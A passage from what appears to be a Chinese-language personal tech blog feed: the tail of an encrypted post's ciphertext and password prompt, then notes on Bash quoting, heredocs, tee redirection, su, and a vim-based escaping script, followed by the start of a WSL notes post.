56571b1ae783c64ca3be331291300bae09b8f0c81bf8b1cd99640489059e27e44fe67652dc576761a93fe3bd0d7aa8641c16768270550e17888f80ecd13e4a8b592f540ce8257f4e958c2c930d659d8632f2fb7c96849fdb69f0db33a5610dcb4055221720f1b9e59591758596e4b6d65789e32263247bf3f7530c6bdf64861ba9d9edd7a1bcf5e3413bd009cc2c2bae993867ab7adc505ed5da54a974aedd14168695ecc0f89096e5fa45f4556aea07198809dbf6b76e2c83dbd864ee13a0c68ce9f09955c39270ff47c7a8442efa10f7807eeaae0d40a8cb7e034d3a885ba8d0ed518f2936aa223472eebd8de1fd1e57011ab6f941eadb3d0d99a83482d69094fe0829c71cb49bdc773cdc5157f579c53331ab61a6062a80ed22afeae670f2209168bd3efe9d5830dd07e04edccc9af38209eb7223af768524d6760c139b133fcac10aff11f3864895300a8515596b1f5e55b91a5057572c7ff091d9e0858426f6569062a4c4bfb9ae291063f50faba41bb1e09d13659bfefaa4dff74676940a7e078b7e8deacf84be4fb3681190c8f8a31827ed4435e3afef547efc015e1762921346ff2b4d8ca406e51a28504a5000e5188095a3390988ea7f11b3b349a5c174587cd80e000a1d282985ec0248ed0dcbda6d7def26b59c6278407cf820e2ce117e85a686f70044783a56ad4fe8b5756f19b331338d0aa257c063ea01c2a7436b0a43f95d667a65bba951729eaea4d3a5cf8ddc9cfcaae7fde0e973b4c747084bdfc91f3df3adefcfe08b25fe5e8dc61c2def42ee71c944e13a737afe92cc0e8d69c16c9af36b1b637aa529d08c1ab22e3ab7be9e7c66cfb50a558d597a98059653ed9b03e74680954ebcfb750ab567e7461279bc7e439ce75b17c87b18de85805358898dcf614b814755e92a428cfb810215bd7cb767e8b8baf4945125bf02043e3b8159bcd62054eaad329b6d30b9b28e8ff75033caf5e221ef6b3d87c06fc55665e7ebc049a803ad6db417d3352f22a42cdaaafd14b29a45b524df0a695fe4ab2827c08ba1d3bc1472a4730ff520b9a65181cb1d6d3139a334a7ac4b405be3626eae6c1eddbef902e3637da83b6a43e201af428887d5e6d8a6787ba6ada42e100e436b0fdcefc99e2eba105558dd95409dc274ed383399c7681c5c3dda594ba8409dd4460995a5788897bc8c44a9203d010a3d6b73a9eb79641ccc48cecfb3d70d85e9178209fe43cfe9d477aabe49b84110d8a7a1c874dfd5a2fc2fd20a776af29d799c849b7ef46460a11c7d1b8712c1f481b7d709f206f6377b8bb6c41ede5a4872a13c8d7e16439d56039b0ee0fc9f41b7237e75ed22d8c785142a7a36c6eaf8750e0d42d6796e3b62688b81b86e5a30af65d66dfffb2689194afd327f1569387218e4e39252b572960f361bcd1f364b2d0fe3043ad2111827c11c27995911d4018c27e6418fd80bc8acd13e4dc2273042f9b7d05ec5f2b11cdddc5ab668e03cf4ef868ccb3aa2465b0027615d53b45d99e8ac8fe6d211699d2f220e8e570c7a7fe28455be77948c99b9e9683d47100df70ea21821165f76e4ee559682be5f16fbd3beb5e9da07f55e8308c2bcb347fa12c188aa0e06548af50215d094b9528c2e273c9072e40e9901b2278678968d74e53d630f7e4422eaff238c70d67ab34286170e39d7c902cb6a33274faafeb58d0143c75d297d3fa9c32ba887e117453556b9de5d061499a8f0471578c2f216b04f0c09e3793c40b117246ea27086594b0fa0ccc87eee0479956625c8c9b5816cd9480fcaa6cc824a2533c7e46adee8375a470597a1c208e159f66a60feafb00d2fd3430ddb40888e3b0b78879b1631c3ae0ca8229e80dea02ceab7ea6d2f9a11d4242ca47e79402f23479637271275b6a0937db1cb9bcb9b8299e525c012f8fa8118b82ba3d881700d290668f664114a56772397d7ab3b42696b856e5bcca3fe891fca2799c81407f20305a4cc19d444d7318eaa5a9ca7ae0ca39a6f8d02b329c82e37f6fa1ce97ea98d928c62eb35ac90c4d8ecb963d114708864118d4e85ad31929667f1767280dad13c1c1cf3567ead231a3c12cb86bb60285e439e98c289f2874fcba79ca01ef0564135986348e7515314ddfce32a536b5e5da35fa171a6749eb0ab2e87594d0e3266d798fd19ed3b6478e9a505a80a5d80dc705b21154c31bf0d71861aba2b7c5e24b62e9906691d7cbf85e7134e10d4c75db6595c1e8c21d6e499c8eb6d460caad901b35a66169904fe2bce693fe417143faf281e7a39e6f075b7bf5b19ece60b00e97501542e1a54d7727cbb848a466f6ee9937aa91d9bd03d981da772e6d35ac0affb32412a082ac575bdf6f02c7170fe1ae81375e7ac56368a823367398bede5157bb8cd165660a8a81cec6e391264f02bd6e8ac07f3071da119821d5bd1c339976bfd79e9d93401f2a71d796efc6d7f537fe92ff8edec773f61f10c9e2303a4285b14f9b8b1bf33a55df57615565d1b5122d8c2c1ededcf8ee806398f77a0c02f3b8b15da6a333fbaecb278d11898ca23543c4dcffc0d2f5dba4533897ca3d388b4c575f4e6284dbd23b0f8e94e905beef35d1a00aa53fef16a45c42db798996a6c5a677025e71b5fa51d5f8f3828e2d11aa8906691530082f6250932de8ccc4180473846630116cdc304c0706155cb1695d954ba9ce8c4b1439803339c33e5c1523c6467a1fd069048603c4736c19e8d492311182e0a26ab9d01d55583ce5a9e6e69dd55053a130481f2983749f20444ec6f5bc804ade6d00dd0895fc53e79313351bc5e9f5332ba44c9f4545c0c5d95a97434c0dd3926c68ec7f648ac0af1cbd7a16c7e741dfc7e5976f8158ef0e0718daba82c536c2b5b5a31fcbeaffadf2a4971638867a56f40b1239b12d4d808bb2a5de38ac6728afd417092ed47a75bd3bd7b01fbe0a72ee3b677a81d422fe8f7ef290610955b1393bbb177d8bcba48389d49b8b8db2a25e7c4af318753c6d7e9eab6ac3ceea846676a8d4d18606c6bc16bbbbfb8dc0ea6385e6136ff47b713fe0c099cef80fedd14d63e14848ccb9de27c3923e3c43edad753bd867f13326c06332d548306245a0b4cf33f656cec44851b0271c282acbd7d0d724725f6e7bb7ed39e6eab20a5b8fcfaca7df9fe10a3c003175c2d4ed755ecab339d0986a7111989d9ea955b7e667a06f7e67117b93a27ad7cbf93b06878ed4be6562c75b329fadd17219b1cb8658c9179cd645f7d81beaf71d00dae806f06ec1f7a1a8c9cfaeb3de45a7247690868cf6d23a5a59ca42632b0013d96b09ddcd1bfe08eb1fa0cc1be009c87aa77754fe3daf8631ea3d0bc0829cd52cd932f0067473881c86139533865246184bdf0fb150f8b3774611132f2c9d6c6f420bac3a80a7c0f56fd511553401bdfd320eda0fbec6f1217e8a1d978c05364e57cebd2cc5c85eb08f9f4ac67fcf536a7a667240f43d1707a3b1d2e05d47cc170aaac3190bdc822c3584e6f0aed418ae858f79e0fb6671ec766f253439a9b6c88f28b1e0fea47a895cba956fe338f9d14d29159e9c92fb3dcba3b5c92d813930562d4773a1908c198b1ce9459b75bd4f49c27594d57592f5bb5caf76cbcd900ecf4c6e831c27de8b55c0f14cfbc7b3559e1d3b5565ee2f491d9c04294c7e3e6542f7a809af7afac3d91ff9c8ad327ec5d1c17f5553c054b278667b454a76acc2da46b0e1b66a2c84116689799b21eb859da7353212ae92ae033c1d7a2f75fb09cc6d3d380ca5e8e77b28d8de280700a1b3f0a2461c440cc9e7dd55efac17f55e0ffa7358ec391524b981b8d695d79296cc04cad4bf0812eaa0e294c5f4d214230c8b13464b97147fab046be9127879fee49e87ffe2b82c119a8b2169f79994c856234e3c09e2c75e04a9347ea2b3dbf406e10fe72e5c1f887a04e1e0712cba3104e8485615dbd225197748de6f3261be765f5b419793f96640f73ace011f9a3428e4c26a489463885d29510fa276bc8551f0f318f6c43668fce1f9164b85806ee3ad2c75638afff4b8e4f5ba70f7508ed35616c2ebfe389e23160e326c8bf54b5ee360660bc64fe1c1fd3217d8c7d48a8334610c8d35dcf939280e71aef29a9316552d1902a4fd043660b2da88fa90fb98a85f9d1193e8081e355497e6f4e3162230f0ea3602ebc09e4ec7d2deeae4bbf60aa77ef8ae059b4cf80c311defdfe6bbe0b2d4a18fb75a343fdd92661f932e2b3d067f42eec92f1c7efb7bcdc12eae5e3bf09351f433d62970b205e811873e3643f52bddb4cf82f86964c98723af7ab7291d67d9b64e068fcff11333490a785e75674f58a1f1263791ea1c2c9b62fd9fabd8edd9bad8b9e6a98a148ad9a24b5cb5dd7f6a7a29a864d09e5ee280fd10e97a3414547962c6ebc3b79dbfba109ea6048aa2b861a767230e92af0060e0cb1996721687e9e94358f837e36b3847b1b0087cdc418de5b6021fc9bf68e794627f301cac106c301b5e34e10d3e3da27c10b93fd076f58898c5c9c7fa9d41438305cb13feda639888940a8fc367f03d40e3c0056916c7a0f373b161679fd5b92835e59a663f9f1c17c48c6401b4880a0338de50d3ca7f568cf4d2f9e199d63e0bee64d5ce7415d1ebd34809d019ecbda6ce3788616de0152fb49ea9bfd5609a61e9b28583f1e93f64fd4227e6690562a4e4e5fbc54d86383ad451c93238875658570199773cf4a23da8d64cbd009ac040d560a199b90d15fbb03b33f3b7251fa5fd037db01dede36e134780768d0cb54bd701ac9e70c2d55c71e416c745745edfbeb04f2aa11f2b3f17258676e7cff2b74ae6a60e6922c32bc4aa7a78ba7d044ee1ba2a4eae3735d835e64adf7e2e7236550f07651340c4026e461d001ce66b1000f6ff53a3eda60924d174ce55e860a26c2f07c6b4539572bfed960eb7df630838f55962ff12a6cd7aa662057c965d2ac45766475664a6babea0aadf29beb07c8f488406f13a99425bd32ada6e215980039c516532a36289e7af1f5c5bc4fc2c07f6b76eeed8e0dd9f47f310bafd1f2c534edd1a75f5cba41e2ae1ba107ea2595c93bd1a9e49531c471e652e58b415e6b880e36dba20551d584bb9c824e03893e31e7c2de2ad1b3177482a3230d23bf5974e6504d13704fe6d898828e3f07f8abcc42796116ecbdef28d117a2abe87115f33f17cca2966ad4aae795128955a49ccc2ceb1519f85dc8c277d438d32be3f3224e6e1c8ac37182c26bc0cc3fe4cc0a28206587fc5b0ffcf385ffe05b85b827b706bf7d9b36b12412fa81a70e0555abf9b8bb9338c4309eaa0441bd4310c8290877bc1e6e93e9f949ad3f53342d93a5747f808f844847cd3502eb59cec22330df3c6f7b44892e157aa23b8571bd00aa3eb588c952fd943d39edee5f69d6ce34ca4970f85ff9c86a2c98454ed78a60e7f455aa9040fde35daa49c537f904c1ead70fb023fdf6e8fc2bf978f08f4a8c355e5f039aaa16f9bce323cc6abadd326255daec314cb42113963c439fc093a29cd3bfd83f2031d7fd1afabab484cbefc7ff43f6ee7ccf58aad941c8abc7c35c8f9cb94f8cebfd3c88f26176c2de24033e14cdff24bdfa2983d0ccffb7db898bfdd3b554a285c529b37f60bc3d20a4670cd4250cabe7a5a44d6e177e84e00088d7eea9f192a0a57de356641297c2b6e88ee114117997d0fc992a111105d36f654eca05b63f937def10c1ba59efa6369a53c64cae57e1ecc9843f027935df17b7f54a7f8d37d88c0327e880045e65b92d798b6324909a0fb780e1b8e658058bb196df0be9b6b1a8de5d82bc775bebd80cbda340f80f8b6ffd08d196110bce9c2fbe312077b57c3d4cbbe2eb338167e0982946e42cc2b3184a69df203a6a2f6f2b3a6db6f022fb1e33744d12bf5ee0b9eec419d057a471300c00a52ef40204d7e1c5bdea348116f7cf6365eb2f22abae9f2f145cf3f58003015a0bd08ad9ccc49d0b87158fc9ec4ed7f2be08662cb9dc7261caca0a2e9ae73f307ba7e662252e8ea8d35dad7311369007f7618040055ef71f73d17e24174de4583685d351a325f692356d12740c7d1ecf9ae0c9239c0d965941324f8222a3a5db464e7f755cfd90e9b942223398dc81bf243bc24836d358a9fbb75b403205c2e8b54ed5a49dd7b119cf75d1ca45a648325db21c11930d103e888c514b01d2c6e1d69d9f47a072bf48e6770f335ab43da829414dd2ad34ea20089e373b86c17dd92f40cca13708020ab3eaf758e18c64e85a5ba18ce347f8234a0c1217522a06f313bf5a2ffa66c03930888175feefc4703f62ce52aef1d4b06a62cff73dfe73b9899882428582c1a23bc131dd88f7ddff3c8da887ea94f540f064cbfa34f8dcd25fd2f4041b5a0ef9a4ba07d6a0e50f23f735ed8e1497ed065686c8afdda0dd5b91e02ae5d08a4861f51e53016626a0e97c759221f1673ecc1ab25ecc2bd1f8c1ef26f463eeeefc1fa83fc532d8729222938e28921c32a88d6f369c2bb77732d8f844d3b47f232a208ca28db18d30ba5d6aca7e8a8d20b6824f65cf73bf02ebb9a582cb332c2ddad173ed157e56e9de87ce7285e6daac5a3135b776afd93b563cf219a466ad20acf25c388fdb8ca7c3aacc9ea814941f44ddd313d6316eac0cdeee6f959cda1224f7c27f9c015359b424ed9ea3f585c1664ef40910abd86768195dc47d5b4c6d9c67d7b80bc794a9049dbee7f6825c3f6</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Solution</category>
        <category>Custom</category>
      </categories>
  </entry>
  <entry>
    <title>Shell Issues</title>
    <url>/2023/09/28/Solution/Linux/Shell%20Issues/</url>
    <content><![CDATA[<h2 id="Debris"><a href="#Debris" class="headerlink" title="Debris"></a>Debris</h2><ul>
<li><p>双引号包裹下引用变量，其中的<strong>换行符号</strong>（不是转义）会被解析，否则会被直接忽视（不会被替换为 <code>\n</code> ），例如：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$pre</span>=<span class="string">&quot;</span></span><br><span class="line"><span class="string">I</span></span><br><span class="line"><span class="string">Love</span></span><br><span class="line"><span class="string">You</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$pre</span>	<span class="comment"># 输出一行内容</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$pre</span>&quot;</span>	<span class="comment"># 输出多行内容</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>引用变量时，若其中存储的是字符串且对字符串的转义有严格要求，则形如 <code>&quot;$var&quot;</code> 的变量引用<strong>等价于</strong>其内容外套一层双引号，该引用过程只发生一次转义。</p>
</li>
</ul>
<h2 id="Solutions"><a href="#Solutions" class="headerlink" title="Solutions"></a>Solutions</h2><h3 id="重定向权限与-tee"><a href="#重定向权限与-tee" class="headerlink" title="重定向权限与 tee"></a>重定向权限与 <code>tee</code></h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo echo $pre_source &gt; /etc/apt/sources.list</span><br></pre></td></tr></table></figure></div>

<p>该语句会提示权限不够，因为 <code>&gt;, &gt;&gt;</code> 等重定向符也需要 root 权限。</p>
<p>可以利用 <code>tee</code> 命令进行重定向：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$pre_source</span>&quot;</span> | sudo <span class="built_in">tee</span> /etc/apt/sources.list</span><br></pre></td></tr></table></figure></div>

<p><code>tee</code> 相当于 <code>&gt;</code> ，<code>tee -a</code> 相当于 <code>&gt;&gt;</code> 。</p>
<h3 id="Here-Document"><a href="#Here-Document" class="headerlink" title="Here Document"></a>Here Document</h3><p>为”here document”的分隔符加双引号，会让其不解析输入内容中的变量表达式 <code>$&lt;str&gt;</code> ：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;cmd&gt; &lt;&lt; <span class="string">&quot;EOF&quot;</span></span><br><span class="line">	<span class="variable">$abc</span></span><br><span class="line">EOF</span><br></pre></td></tr></table></figure></div>

<p>终止符仍为 <code>EOF</code> 不加引号，且必须顶格。</p>
<hr>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 设置 root 密码</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">root_passwd</span></span>()&#123;</span><br><span class="line">    passwd -d root &gt; /dev/null</span><br><span class="line">    passwd root &lt;&lt;- <span class="string">EOF &gt; /dev/null</span></span><br><span class="line"><span class="string">        &quot;$pre_passwd&quot;</span></span><br><span class="line"><span class="string">        &quot;$pre_passwd&quot;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">    <span class="comment"># EOF 好像必须挤在开头, 且后面不能跟别的东西, 包括注释</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>&lt;&lt;-</code> 能让传入的数据忽略制表符 <code>\t</code> 。</p>
<p><strong>但是</strong>在编辑器 VSC 中的 tab 按键产生的缩进实际上是多个空格，而 Vim 下的 tab 产生的缩进用的才是制表符 <code>\t</code> 。</p>
<p>由于 <code>&lt;&lt;-</code> 只会忽略制表符 <code>\t</code> 而不是空格，因此此处输入的密码前面有数个空格。</p>
<p><strong>同时</strong> hd 下的双引号并不会被解析，因此密码前后各有一个双引号。</p>
<h3 id="shell-与-echo-的转义"><a href="#shell-与-echo-的转义" class="headerlink" title="shell 与 echo 的转义"></a><code>shell</code> 与 <code>echo</code> 的转义</h3><p>shell 真是转义地狱：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">pre=<span class="string">&quot;</span></span><br><span class="line"><span class="string">        echo \&quot;</span></span><br><span class="line"><span class="string">#   for i in &#123;0..255&#125;; do print -Pn \\\&quot;%\\\$&#123;i&#125;F\\\$&#123;(l:3::0:)i&#125;%f \\\&quot; \\\$&#123;\\\$&#123;(M)\\\$((i%8)):#7&#125;:+\\\$&#x27;\\\\n&#x27;&#125;; done</span></span><br><span class="line"><span class="string">        \&quot;</span></span><br><span class="line"><span class="string">&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>执行 <code>su - festu -c $pre</code> 换行会被转义后输出。</p>
<p><strong>解释：</strong></p>
<p><code>echo</code> 会对传入的特殊字符转义一次。其转义范围包括 <code>\n, \t</code> 等特殊字符，但不包括 <code>$, `, &quot;</code> 。</p>
<p>据此来剖析一下上述语句的转义流程。</p>
<p>首先是 $pre 变量被创建，shell 解析双引号括起的字符串时，会对其中的 <code>$, `, &quot;</code> 进行一次转义。因此存入 $pre 中的换行周边的内容为 <code>\\n</code> 。</p>
<p>接着变量作为参数被给命令 <code>su</code> ，这个过程原样传递。传入的内容又作为 shell 命令被解析，由于换行符仍然是被双引号括起的字符串，因此再次发生转义，<code>\\n</code> 变为 <code>\n</code> 作为参数被传给 <code>echo</code> 命令，然后又被转义，最后变成了换行被输出。</p>
<p>前两次转义对 <code>$, `, &quot;</code> 同样生效，同时又作用于 <code>\\\\n</code> 中的反斜杠，换行符也牵连着被**转义**了两次（当然这里只是说起了转义的效果，实际上 shell 解析双引号括起的字符串时并不解析换行符本身的转义即  <code>\n</code> ）</p>
<p>而 echo 的转义只对换行符本身起效，因此换行符最终被转义了三次，区别于 shell 特殊字符的两次。</p>
<p><strong>解决方案：</strong>为 <code>echo</code> 添加 <code>-E</code> 参数取消它自带的特殊字符转义：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pre=<span class="string">&quot;</span></span><br><span class="line"><span class="string">        echo -E \&quot;</span></span><br><span class="line"><span class="string">#   for i in &#123;0..255&#125;; do print -Pn \\\&quot;%\\\$&#123;i&#125;F\\\$&#123;(l:3::0:)i&#125;%f \\\&quot; \\\$&#123;\\\$&#123;(M)\\\$((i%8)):#7&#125;:+\\\$&#x27;\\\\n&#x27;&#125;; done</span></span><br><span class="line"><span class="string">        \&quot;</span></span><br><span class="line"><span class="string">&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>值得一提的是 echo 与 shell 的转义非常复杂，反复混用可能会非常混乱，造成”转义地狱”的糟糕情况（虽然 shell 早就是了），而且研究起来价值不高，因此不建议反复混用或深究。</p>
<hr>
<p>（就深究一点点 &#x3D; &#x3D;）</p>
<p>例如 shell 并不解析单引号字符串中的转义，因此理论上下面的脚本也能输出 <code>\n</code> ：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pre=<span class="string">&quot;</span></span><br><span class="line"><span class="string">        echo &#x27;</span></span><br><span class="line"><span class="string">#   for i in &#123;0..255&#125;; do print -Pn \\\&quot;%\\\$&#123;i&#125;F\\\$&#123;(l:3::0:)i&#125;%f \\\&quot; \\\$&#123;\\\$&#123;(M)\\\$((i%8)):#7&#125;:+\\\$&#x27;\\\\n&#x27;&#125;; done</span></span><br><span class="line"><span class="string">        &#x27;</span></span><br><span class="line"><span class="string">&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>对于 <code>\\\\n</code> ，变量赋值时是双引号字符串，被转义一次，变为 <code>\\n</code> ；执行字符串表示的命令时是单引号字符串，因此不做转义；传给 <code>echo</code> 后被转义一次，变为 <code>\n</code> 。</p>
<p>理论上该语句只对换行符做了两次转义，最后输出的只是字符 <code>\n</code> 。但实际上输出时仍发生了换行。</p>
<p>除此之外还有很多奇怪的问题…总之不建议深究。</p>
<hr>
<p>最后作出一个结论，如果是全是使用双引号的需要二次转义的场景（写入配置时），使用 <code>echo -E</code></p>
<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>写脚本时看能希望在脚本运行时，永久将『标准错误输入』重定向至某处，利用 <code>exec</code> 可实现：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 2&gt;~/errLog		<span class="comment"># 重定向至文件</span></span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/null	<span class="comment"># 重定向至空</span></span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/tty1	<span class="comment"># 将标准输出重定向到 tty1 终端</span></span><br></pre></td></tr></table></figure></div>

<p>标准输入输出设备标识符：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/proc/self/fd/0：标准输入 0</span><br><span class="line">/proc/self/fd/1：标准输出 1 </span><br><span class="line">/proc/self/fd/2：标准错误输出 2</span><br></pre></td></tr></table></figure></div>

<h4 id="与另一个用户通信"><a href="#与另一个用户通信" class="headerlink" title="与另一个用户通信"></a>与另一个用户通信</h4><p><code>write bob &gt; /dev/tty2</code> 与同一系统下的另一用户 bob 通信。</p>
<h3 id="su-指定用户执行命令"><a href="#su-指定用户执行命令" class="headerlink" title="su 指定用户执行命令"></a><code>su</code> 指定用户执行命令</h3><p>在交互式 shell 中 su 指定用户执行命令并不能准确读取用户的环境变量如 <code>~</code> ，但在脚本中运行时可以。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">su - festu -c <span class="string">&quot;</span></span><br><span class="line"><span class="string">	cd ~;</span></span><br><span class="line"><span class="string">	mkdir -p Tmp;</span></span><br><span class="line"><span class="string">	cd Tmp;</span></span><br><span class="line"><span class="string">	echo <span class="variable">$user</span> &gt;&gt; tmp.txt</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="comment"># tmp.txt 中的内容为&quot;festu&quot;，有换行可以不要分号</span></span><br><span class="line"><span class="comment"># sudo 执行 Shell 脚本时也能读取正确的用户变量</span></span><br></pre></td></tr></table></figure></div>

<p>奇怪的转义特性（感觉是 BUG）：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">user=<span class="string">&quot;festu&quot;</span></span><br><span class="line">su - festu -c <span class="string">&quot;echo \$user&quot;</span> <span class="comment"># 输出空行</span></span><br><span class="line">su - festu -c <span class="string">&quot;echo <span class="variable">$user</span>&quot;</span> <span class="comment"># 输出&quot;festu&quot;</span></span><br><span class="line">su - festu -c <span class="string">&quot;echo \&quot;\$user\&quot;&quot;</span> <span class="comment"># 输出&quot;festu&quot;</span></span><br><span class="line">su - festu -c <span class="string">&quot;echo \&quot;\\\$user\&quot;&quot;</span> <span class="comment"># 输出&quot;$user&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>当试图用 <code>echo</code> 向配置文件中写入原生的 <code>$HOME</code> 等字符串时，需要注意转义的次数。</p>
<h3 id="Vim-操作与转义脚本"><a href="#Vim-操作与转义脚本" class="headerlink" title="Vim 操作与转义脚本"></a>Vim 操作与转义脚本</h3><p><strong>使用场景：</strong></p>
<p>在编写系统配置脚本时，希望用 <code>echo &#39;...&#39; &gt; conf</code> 语句去快速创建配置文件，由于单引号内的字符是绝对的原始字符串，因此无需特殊处理。但如果使用了双引号，就要考虑对原配置文件进行转义处理。</p>
<p>更进一步，脚本中可能需要指定用户执行配置命令，以利用用户的环境变量，如家目录 <code>~</code> ：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">su - &lt;user&gt; -c <span class="string">&quot;</span></span><br><span class="line"><span class="string">	echo \&quot;</span></span><br><span class="line"><span class="string">		...</span></span><br><span class="line"><span class="string">	\&quot; &gt; ~/conf</span></span><br><span class="line"><span class="string">&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>此时就需要对配置文件的内容进行二次转义。</p>
<p><strong>转义脚本：</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$1</span> ];<span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;0&#125;</span> fileName [times]&quot;</span></span><br><span class="line">	<span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$1</span> == <span class="string">&quot;-h&quot;</span> || <span class="variable">$1</span> == <span class="string">&quot;--help&quot;</span> ]];<span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Escape special characters in \&quot;Double Quotes\&quot; of shell scripts (for one time or more).&quot;</span></span><br><span class="line">	<span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$2</span> ];<span class="keyword">then</span></span><br><span class="line">	<span class="built_in">times</span>=1</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">times</span>=<span class="variable">$2</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ((i=<span class="number">0</span>;i&lt;<span class="variable">$&#123;times&#125;</span>;i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	vim <span class="variable">$1</span> &lt;&lt;- <span class="string">EOF</span></span><br><span class="line"><span class="string">		:%s/\\\\/\\\\\\\\/g</span></span><br><span class="line"><span class="string">		:%s/\&quot;/\\\\\&quot;/g</span></span><br><span class="line"><span class="string">		:%s/[\$]/\\\\\$/g</span></span><br><span class="line"><span class="string">		:%s/\`/\\\\\`/g</span></span><br><span class="line"><span class="string">		:wq</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div>

<p><strong>解析：</strong></p>
<p>非常的美妙不是吗。</p>
<p>首先在终端中键入的（即保存在文本中的） <code>\\</code> 被 shell 解析时发生第一次转义。</p>
<p>对于表达式 <code>s/&lt;regex&gt;/&lt;string&gt;/g</code> ，首先他会<strong>直观地</strong>替换 vim 显示的内容（尤其是对于反斜杠）。</p>
<p>表达式中 regex 部分被视为正则表达式，string 部分被视为普通字符串，<code>\\</code> 由于其特殊性，不论在 regex 部分还是 string 部分都会且仅会被转义一次变为 <code>\</code> 。</p>
<p>由于替换的”直观性”，<strong>在 vim 中看到的</strong>的所有 <code>\</code> 会被挨个替换<br>而对于 <code>$</code> 字符，由于在正则表达式中它代表结尾，因此在 regex 中表示一个 <code>$</code> ，需要用 <code>\$</code> 。</p>
<p>由于这是转义一次后的结果，因此写在脚本中的字符串为 <code>\\$</code> ；或者用 <code>[$]</code> 即 <code>[\\$]</code> 也可以。而在 string 部分 <code>$</code> 是普通字符，因此不需要转义。</p>
<p>对于反引号 <code>`</code> ，由于在 shell 脚本中它有特殊含义，因此首先需要用 <code>\\\`</code> 来转义，使其在被 shell 解析后仍为反引号，而不是作为命令解析器被处理。</p>
<p>从这个角度来讲，<code>$</code> 也应该额外添加反引号做转义，事实上这么做确实是更好的。</p>
<p>回到反引号，在作为 vim 命令模式的参数传入时它和美元符号一样没有特殊含义，因此不再需要额外的转义。</p>
]]></content>
      <categories>
        <category>Solution</category>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title>WSL-Issues</title>
    <url>/2023/09/23/Solution/Linux/WSL-Issues/</url>
    <content><![CDATA[<h2 id="Debris"><a href="#Debris" class="headerlink" title="Debris"></a>Debris</h2><ul>
<li>Windows 与 Linux 文件互访：Windows 文件系统整个在 <code>/mnt/</code> 下，例如 C、D、E 盘分别对应 <code>/mnt/c/, /mnt/d/, /mnt/e/</code></li>
<li>关于家庭版 Windows『Windows 防火墙 &#x2F; 内核隔离』可能造成的虚拟化功能管理失效问题：<a class="link"   href="https://blog.csdn.net/qq_43780850/article/details/108961906" >参考 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
